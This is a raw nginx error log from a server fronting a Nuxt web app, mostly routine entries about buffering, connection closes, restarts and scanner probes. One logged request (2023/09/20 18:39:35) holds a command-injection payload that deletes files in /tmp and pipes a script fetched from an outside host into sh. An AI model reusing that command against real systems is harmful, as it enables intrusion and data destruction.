2023/09/19 19:41:31 [warn] 22#22: *13 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/2/00/0000000002 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/19 19:41:37 [warn] 22#22: *12 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/3/00/0000000003 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/19 19:41:37 [warn] 22#22: *14 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/4/00/0000000004 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/19 21:01:10 [info] 22#22: *54 client closed connection while waiting for request, client: 45.33.108.202, server: 0.0.0.0:80
2023/09/19 21:05:01 [info] 22#22: *55 client sent invalid method while reading client request line, client: 134.209.178.115, server: _, request: " {  wQ}í|Itñí;û9≥?µ"
2023/09/19 21:05:01 [info] 22#22: *56 client sent invalid method while reading client request line, client: 134.209.178.115, server: _, request: " {  we„Á=◊kóVÇΩ-ò…ÏıÔ"
2023/09/19 21:05:01 [info] 22#22: *57 client 134.209.178.115 closed keepalive connection
2023/09/19 21:05:01 [info] 22#22: *59 client 134.209.178.115 closed keepalive connection
2023/09/19 21:05:01 [info] 22#22: *61 client 134.209.178.115 closed keepalive connection
2023/09/19 21:05:01 [info] 22#22: *63 client sent invalid method while reading client request line, client: 134.209.178.115, server: _, request: " {  wÌ Öà>w¶„XùÏÚ4¸‘µÛDgˇ'ÜΩ»ÃÁ>  ¿/¿+¿¿¿¿	¿¿"
2023/09/19 21:05:01 [info] 22#22: *64 client 134.209.178.115 closed keepalive connection
2023/09/19 21:05:01 [info] 22#22: *66 client 134.209.178.115 closed keepalive connection
2023/09/19 21:05:01 [info] 22#22: *68 client 134.209.178.115 closed keepalive connection
2023/09/19 21:05:01 [info] 22#22: *70 client 134.209.178.115 closed keepalive connection
2023/09/19 21:05:01 [info] 22#22: *72 client 134.209.178.115 closed keepalive connection
2023/09/19 21:05:01 [info] 22#22: *74 client 134.209.178.115 closed keepalive connection
2023/09/19 21:05:01 [info] 22#22: *76 client 134.209.178.115 closed keepalive connection
2023/09/19 21:05:01 [info] 22#22: *78 client 134.209.178.115 closed keepalive connection
2023/09/19 21:05:01 [info] 22#22: *80 client 134.209.178.115 closed keepalive connection
2023/09/19 21:09:40 [info] 22#22: *82 client 190.27.33.61 closed keepalive connection
2023/09/19 21:28:22 [info] 22#22: *84 client 188.163.109.87 closed keepalive connection
2023/09/19 21:34:25 [info] 22#22: *86 client sent invalid method while reading client request line, client: 104.248.114.180, server: _, request: " Í  ÊI~Îë/5Fsç§∆ÑÖ_#Ÿ3=ÛT ØfÔØK;@Œ ‘ãµ”∑ØZ$ShaR(yWè[°∑&YAŒå√ &¿+¿/¿,¿0Ã©Ã®¿	¿¿"
2023/09/19 22:00:04 [info] 22#22: *89 client 94.102.61.10 closed keepalive connection
2023/09/19 23:02:55 [info] 22#22: *91 client 198.199.113.56 closed keepalive connection
2023/09/19 23:24:24 [info] 22#22: *93 client closed connection while waiting for request, client: 62.133.46.16, server: 0.0.0.0:80
2023/09/20 01:01:25 [info] 22#22: *96 client prematurely closed connection (32: Broken pipe) while sending to client, client: 94.33.151.112, server: _, request: "GET / HTTP/1.0", upstream: "http://85.31.238.178:3000/", host: "85.31.238.178"
2023/09/20 01:02:57 [info] 22#22: *98 client prematurely closed connection (32: Broken pipe) while sending to client, client: 94.45.53.182, server: _, request: "GET / HTTP/1.0", upstream: "http://85.31.238.178:3000/", host: "85.31.238.178"
2023/09/20 01:22:42 [info] 22#22: *100 client prematurely closed connection (32: Broken pipe) while sending to client, client: 85.251.105.234, server: _, request: "GET / HTTP/1.0", upstream: "http://85.31.238.178:3000/", host: "85.31.238.178"
2023/09/20 01:23:23 [info] 22#22: *102 client 4.225.160.86 closed keepalive connection
2023/09/20 02:37:24 [info] 22#22: *104 client 130.211.54.158 closed keepalive connection
2023/09/20 02:47:45 [info] 22#22: *106 client 185.180.143.49 closed keepalive connection
2023/09/20 03:24:23 [info] 22#22: *108 client prematurely closed connection (32: Broken pipe) while sending to client, client: 93.61.145.203, server: _, request: "GET / HTTP/1.0", upstream: "http://85.31.238.178:3000/", host: "85.31.238.178"
2023/09/20 04:16:29 [info] 22#22: *110 client 20.14.195.196 closed keepalive connection
2023/09/20 09:31:39 [info] 22#22: *114 recv() failed (104: Connection reset by peer) while waiting for request, client: 167.94.145.56, server: 0.0.0.0:80
2023/09/20 09:31:40 [info] 22#22: *115 client 167.94.145.56 closed keepalive connection (104: Connection reset by peer)
2023/09/20 09:31:40 [info] 22#22: *117 client 167.94.145.56 closed keepalive connection
2023/09/20 09:31:40 [info] 22#22: *119 client sent invalid request while reading client request line, client: 167.94.145.56, server: _, request: "PRI * HTTP/2.0"
2023/09/20 09:31:40 [info] 22#22: *119 recv() failed (104: Connection reset by peer) while reading client request line, client: 167.94.145.56, server: _, request: "PRI * HTTP/2.0"
2023/09/20 09:43:15 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/20 09:43:15 [notice] 22#22: gracefully shutting down
2023/09/20 09:43:15 [notice] 22#22: exiting
2023/09/20 09:43:15 [notice] 22#22: exit
2023/09/20 09:43:15 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2023/09/20 09:43:15 [notice] 1#1: worker process 22 exited with code 0
2023/09/20 09:43:15 [notice] 1#1: exit
2023/09/20 09:43:52 [notice] 1#1: using the "epoll" event method
2023/09/20 09:43:52 [notice] 1#1: nginx/1.25.2
2023/09/20 09:43:52 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/20 09:43:52 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/20 09:43:52 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/20 09:43:52 [notice] 1#1: start worker processes
2023/09/20 09:43:52 [notice] 1#1: start worker process 23
2023/09/20 09:49:01 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/20 09:49:01 [notice] 23#23: gracefully shutting down
2023/09/20 09:49:01 [notice] 23#23: exiting
2023/09/20 09:49:01 [notice] 23#23: exit
2023/09/20 09:49:02 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/20 09:49:02 [notice] 1#1: worker process 23 exited with code 0
2023/09/20 09:49:02 [notice] 1#1: exit
2023/09/20 09:49:23 [notice] 1#1: using the "epoll" event method
2023/09/20 09:49:23 [notice] 1#1: nginx/1.25.2
2023/09/20 09:49:23 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/20 09:49:23 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/20 09:49:23 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/20 09:49:23 [notice] 1#1: start worker processes
2023/09/20 09:49:23 [notice] 1#1: start worker process 23
2023/09/20 10:20:58 [info] 23#23: *1 client closed connection while waiting for request, client: 45.33.108.202, server: 0.0.0.0:80
2023/09/20 10:46:14 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/20 10:46:14 [notice] 23#23: gracefully shutting down
2023/09/20 10:46:14 [notice] 23#23: exiting
2023/09/20 10:46:14 [notice] 23#23: exit
2023/09/20 10:46:14 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/20 10:46:14 [notice] 1#1: worker process 23 exited with code 0
2023/09/20 10:46:14 [notice] 1#1: exit
2023/09/20 10:46:52 [notice] 1#1: using the "epoll" event method
2023/09/20 10:46:52 [notice] 1#1: nginx/1.25.2
2023/09/20 10:46:52 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/20 10:46:52 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/20 10:46:52 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/20 10:46:52 [notice] 1#1: start worker processes
2023/09/20 10:46:52 [notice] 1#1: start worker process 23
2023/09/20 10:56:30 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/20 10:56:30 [notice] 23#23: gracefully shutting down
2023/09/20 10:56:30 [notice] 23#23: exiting
2023/09/20 10:56:30 [notice] 23#23: exit
2023/09/20 10:56:30 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/20 10:56:30 [notice] 1#1: worker process 23 exited with code 0
2023/09/20 10:56:30 [notice] 1#1: exit
2023/09/20 10:57:01 [notice] 1#1: using the "epoll" event method
2023/09/20 10:57:01 [notice] 1#1: nginx/1.25.2
2023/09/20 10:57:01 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/20 10:57:01 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/20 10:57:01 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/20 10:57:01 [notice] 1#1: start worker processes
2023/09/20 10:57:01 [notice] 1#1: start worker process 23
2023/09/20 11:05:03 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/20 11:05:03 [notice] 23#23: gracefully shutting down
2023/09/20 11:05:03 [notice] 23#23: exiting
2023/09/20 11:05:03 [notice] 23#23: exit
2023/09/20 11:05:03 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/20 11:05:03 [notice] 1#1: worker process 23 exited with code 0
2023/09/20 11:05:03 [notice] 1#1: exit
2023/09/20 11:05:26 [notice] 1#1: using the "epoll" event method
2023/09/20 11:05:26 [notice] 1#1: nginx/1.25.2
2023/09/20 11:05:26 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/20 11:05:26 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/20 11:05:26 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/20 11:05:26 [notice] 1#1: start worker processes
2023/09/20 11:05:26 [notice] 1#1: start worker process 22
2023/09/20 11:30:55 [warn] 22#22: *1 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: 103.77.186.50, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/20 11:31:54 [info] 22#22: *3 client timed out (110: Connection timed out) while waiting for request, client: 103.77.186.50, server: 0.0.0.0:80
2023/09/20 12:12:04 [info] 22#22: *7 client 23.236.147.154 closed keepalive connection
2023/09/20 12:12:04 [info] 22#22: *9 client 23.236.147.154 closed keepalive connection (104: Connection reset by peer)
2023/09/20 12:12:04 [info] 22#22: *11 client 23.236.147.154 closed keepalive connection (104: Connection reset by peer)
2023/09/20 12:12:04 [info] 22#22: *13 client 23.236.147.154 closed keepalive connection (104: Connection reset by peer)
2023/09/20 12:12:04 [info] 22#22: *15 client 23.236.147.154 closed keepalive connection
2023/09/20 12:12:04 [info] 22#22: *17 client 167.71.244.58 closed keepalive connection
2023/09/20 13:10:25 [info] 22#22: *22 client closed connection while waiting for request, client: 95.37.82.1, server: 0.0.0.0:80
2023/09/20 13:10:25 [info] 22#22: *23 client 95.37.82.1 closed keepalive connection
2023/09/20 14:54:55 [info] 22#22: *25 client closed connection while waiting for request, client: 181.214.147.242, server: 0.0.0.0:80
2023/09/20 15:56:35 [info] 22#22: *26 client sent invalid method while reading client request line, client: 143.198.111.66, server: _, request: " Í  Ên	¥dY«˚Z…p5•ü<]&X"
2023/09/20 17:57:48 [info] 22#22: *29 recv() failed (104: Connection reset by peer) while waiting for request, client: 167.94.138.124, server: 0.0.0.0:80
2023/09/20 17:57:49 [info] 22#22: *30 client 167.94.138.124 closed keepalive connection (104: Connection reset by peer)
2023/09/20 17:57:50 [info] 22#22: *32 client 167.94.138.124 closed keepalive connection
2023/09/20 17:57:50 [info] 22#22: *34 client sent invalid request while reading client request line, client: 167.94.138.124, server: _, request: "PRI * HTTP/2.0"
2023/09/20 17:57:51 [info] 22#22: *34 recv() failed (104: Connection reset by peer) while reading client request line, client: 167.94.138.124, server: _, request: "PRI * HTTP/2.0"
2023/09/20 18:39:35 [info] 22#22: *37 epoll_wait() reported that client prematurely closed connection, so upstream connection is closed too while connecting to upstream, client: 5.11.228.163, server: _, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+http://185.254.37.243/jaws.sh+-O-|sh; HTTP/1.1", upstream: "http://85.31.238.178:3000/shell?cd+/tmp;rm+-rf+*;wget+http://185.254.37.243/jaws.sh+-O-|sh;", host: "127.0.0.1:80"
2023/09/20 18:39:37 [info] 22#22: *39 client closed connection while waiting for request, client: 5.11.228.163, server: 0.0.0.0:80
2023/09/20 18:44:41 [info] 22#22: *40 client 82.141.165.158 closed keepalive connection
2023/09/20 19:30:42 [warn] 22#22: *42 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/2/00/0000000002 while reading upstream, client: 49.36.210.89, server: _, request: "GET /_nuxt/entry.5739cbbc.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.5739cbbc.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/20 19:30:42 [warn] 22#22: *45 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/3/00/0000000003 while reading upstream, client: 49.36.210.89, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/21 01:38:45 [info] 22#22: *53 client 80.195.148.174 closed keepalive connection
2023/09/21 05:21:16 [info] 22#22: *57 client sent invalid method while reading client request line, client: 165.227.224.77, server: _, request: "¸ ¯À"Wô¨Â	&\Sît MÀëSoHûÆx	Œc"
2023/09/21 05:21:16 [info] 22#22: *57 recv() failed (104: Connection reset by peer) while reading client request line, client: 165.227.224.77, server: _, request: "¸ ¯À"Wô¨Â	&\Sît MÀëSoHûÆx	Œc"
2023/09/21 07:26:35 [info] 22#22: *60 client 103.248.35.97 closed keepalive connection
2023/09/21 08:12:30 [info] 22#22: *62 client 194.187.176.66 closed keepalive connection
2023/09/21 08:12:35 [info] 22#22: *64 client 194.187.176.231 closed keepalive connection
2023/09/21 08:14:22 [info] 22#22: *66 client 84.232.140.245 closed keepalive connection
2023/09/21 09:04:37 [info] 22#22: *68 client 168.90.32.183 closed keepalive connection
2023/09/21 10:55:22 [info] 22#22: *70 client 34.76.158.233 closed keepalive connection
2023/09/21 11:28:45 [warn] 22#22: *72 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/4/00/0000000004 while reading upstream, client: 103.77.186.10, server: _, request: "GET /_nuxt/entry.5739cbbc.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.5739cbbc.js", host: "85.31.238.178"
2023/09/21 11:28:46 [warn] 22#22: *83 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/5/00/0000000005 while reading upstream, client: 103.77.186.10, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/21 11:29:33 [info] 22#22: *72 client 103.77.186.10 closed keepalive connection
2023/09/21 11:29:33 [info] 22#22: *78 client 103.77.186.10 closed keepalive connection
2023/09/21 11:29:33 [info] 22#22: *77 client 103.77.186.10 closed keepalive connection
2023/09/21 11:29:33 [info] 22#22: *73 client 103.77.186.10 closed keepalive connection
2023/09/21 11:29:33 [info] 22#22: *97 client 103.77.186.10 closed keepalive connection
2023/09/21 11:29:33 [info] 22#22: *81 client 103.77.186.10 closed keepalive connection
2023/09/21 11:29:33 [info] 22#22: *83 client 103.77.186.10 closed keepalive connection
2023/09/21 11:33:21 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/21 11:33:21 [notice] 22#22: gracefully shutting down
2023/09/21 11:33:21 [notice] 22#22: exiting
2023/09/21 11:33:21 [notice] 22#22: exit
2023/09/21 11:33:21 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2023/09/21 11:33:21 [notice] 1#1: worker process 22 exited with code 0
2023/09/21 11:33:21 [notice] 1#1: exit
2023/09/21 11:35:50 [notice] 1#1: using the "epoll" event method
2023/09/21 11:35:50 [notice] 1#1: nginx/1.25.2
2023/09/21 11:35:50 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/21 11:35:50 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/21 11:35:50 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/21 11:35:50 [notice] 1#1: start worker processes
2023/09/21 11:35:50 [notice] 1#1: start worker process 22
2023/09/21 11:41:04 [info] 22#22: *2 client timed out (110: Connection timed out) while waiting for request, client: 103.77.186.10, server: 0.0.0.0:80
2023/09/21 11:41:31 [info] 22#22: *1 client 103.77.186.10 closed keepalive connection
2023/09/21 11:43:52 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/21 11:43:52 [notice] 22#22: gracefully shutting down
2023/09/21 11:43:52 [notice] 22#22: exiting
2023/09/21 11:43:52 [notice] 22#22: exit
2023/09/21 11:43:52 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2023/09/21 11:43:52 [notice] 1#1: worker process 22 exited with code 0
2023/09/21 11:43:52 [notice] 1#1: exit
2023/09/21 11:45:11 [notice] 1#1: using the "epoll" event method
2023/09/21 11:45:11 [notice] 1#1: nginx/1.25.2
2023/09/21 11:45:11 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/21 11:45:11 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/21 11:45:11 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/21 11:45:11 [notice] 1#1: start worker processes
2023/09/21 11:45:11 [notice] 1#1: start worker process 23
2023/09/21 11:49:07 [warn] 23#23: *2 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: 103.77.186.10, server: _, request: "GET /_nuxt/entry.efb8bfc9.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.efb8bfc9.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/21 11:49:08 [warn] 23#23: *12 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/2/00/0000000002 while reading upstream, client: 103.77.186.10, server: _, request: "GET /_nuxt/pizza-opacity.3f1e980f.png HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/pizza-opacity.3f1e980f.png", host: "85.31.238.178", referrer: "http://85.31.238.178/_nuxt/default.232ef19b.css"
2023/09/21 11:50:08 [warn] 23#23: *30 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/3/00/0000000003 while reading upstream, client: 103.77.186.10, server: _, request: "GET /_nuxt/entry.efb8bfc9.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.efb8bfc9.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/21 11:50:32 [info] 23#23: *33 client 103.77.186.10 closed keepalive connection
2023/09/21 11:50:32 [info] 23#23: *30 client 103.77.186.10 closed keepalive connection
2023/09/21 11:50:32 [info] 23#23: *35 client 103.77.186.10 closed keepalive connection
2023/09/21 11:50:32 [info] 23#23: *38 client 103.77.186.10 closed keepalive connection
2023/09/21 11:50:32 [info] 23#23: *28 client 103.77.186.10 closed keepalive connection
2023/09/21 11:50:32 [info] 23#23: *40 client 103.77.186.10 closed keepalive connection
2023/09/21 11:58:38 [info] 23#23: *62 client 103.77.186.10 closed keepalive connection
2023/09/21 12:21:27 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2023/09/21 12:21:27 [notice] 23#23: gracefully shutting down
2023/09/21 12:21:27 [notice] 23#23: exiting
2023/09/21 12:21:27 [notice] 23#23: exit
2023/09/21 12:21:27 [notice] 1#1: signal 17 (SIGCHLD) received from 23
2023/09/21 12:21:27 [notice] 1#1: worker process 23 exited with code 0
2023/09/21 12:21:27 [notice] 1#1: exit
2023/09/21 12:21:38 [notice] 1#1: using the "epoll" event method
2023/09/21 12:21:38 [notice] 1#1: nginx/1.25.2
2023/09/21 12:21:38 [notice] 1#1: built by gcc 12.2.0 (Debian 12.2.0-14) 
2023/09/21 12:21:38 [notice] 1#1: OS: Linux 5.15.0-1041-kvm
2023/09/21 12:21:38 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2023/09/21 12:21:38 [notice] 1#1: start worker processes
2023/09/21 12:21:38 [notice] 1#1: start worker process 23
2023/09/21 12:21:44 [warn] 23#23: *1 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: 103.77.186.10, server: _, request: "GET /_nuxt/entry.9e2b0d0e.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.9e2b0d0e.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/21 12:24:44 [info] 23#23: *30 client timed out (110: Connection timed out) while waiting for request, client: 103.77.186.10, server: 0.0.0.0:80
2023/09/21 12:32:21 [warn] 23#23: *40 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/2/00/0000000002 while reading upstream, client: 103.77.186.10, server: _, request: "GET /_nuxt/entry.be1bb8fa.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.be1bb8fa.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
2023/09/21 12:35:08 [warn] 23#23: *77 an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/3/00/0000000003 while reading upstream, client: 49.36.210.89, server: _, request: "GET /_nuxt/entry.be1bb8fa.js HTTP/1.1", upstream: "http://85.31.238.178:3000/_nuxt/entry.be1bb8fa.js", host: "85.31.238.178", referrer: "http://85.31.238.178/"
